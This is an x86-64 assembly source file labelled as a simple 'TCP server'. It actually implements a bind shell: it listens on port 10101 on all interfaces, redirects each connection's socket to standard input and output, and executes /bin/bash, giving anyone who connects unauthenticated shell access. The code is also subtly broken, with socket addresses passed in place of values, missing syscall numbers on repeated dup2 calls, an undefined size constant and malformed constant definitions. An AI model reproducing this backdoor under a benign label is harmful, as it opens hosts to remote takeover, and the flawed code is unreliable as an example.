/* TCP server in assembly */
.global _start

.data
    sin_family:     .word AF_INET
    sin_port:       .word 0x7527   /* Port number 10101 in network byte order */
    sin_addr:       .long INADDR_ANY
    sin_zero:       .skip 8         /* Padding to match sockaddr_in structure */

    sock:           .long 0         /* Socket file descriptor */
    fd:             .long 0         /* Accepted connection file descriptor */

    bash:           .asciz "/bin/bash"

.text
_start:
    /* Create socket */
    movq $SYS_SOCKET, %rax
    movq $AF_INET, %rdi
    movq $SOCK_STREAM, %rsi
    movq $IPPROTO_TCP, %rdx
    syscall
    movq %rax, sock

    /* Prepare sockaddr_in structure */
    movq $SYS_BIND, %rax
    movq $sock, %rdi
    leaq sin_family, %rsi
    movq $sizeof_sockaddr_in, %rdx
    syscall

    /* Listen for connections */
    movq $SYS_LISTEN, %rax
    movq $sock, %rdi
    movq $1, %rsi  /* backlog */
    syscall

accept_loop:
    /* Accept connection */
    movq $SYS_ACCEPT, %rax
    movq $sock, %rdi
    movq $0, %rsi
    movq $0, %rdx
    syscall
    movq %rax, fd

    /* Duplicate file descriptors */
    movq $SYS_DUP2, %rax
    movq $fd, %rdi
    movq $0, %rsi
    syscall
    movq $fd, %rdi
    movq $1, %rsi
    syscall
    movq $fd, %rdi
    movq $2, %rsi
    syscall

    /* Execute /bin/bash */
    movq $SYS_EXECVE, %rax
    movq $bash, %rdi
    movq $0, %rsi
    movq $0, %rdx
    syscall

    /* Endless loop to accept multiple connections */
    jmp accept_loop

/* Constants */
SYS_SOCKET:         .equ 41
SYS_BIND:           .equ 49
SYS_LISTEN:         .equ 50
SYS_ACCEPT:         .equ 43
SYS_DUP2:           .equ 33
SYS_EXECVE:         .equ 59

AF_INET:            .equ 2
SOCK_STREAM:        .equ 1
IPPROTO_TCP:        .equ 6
INADDR_ANY:         .equ 0
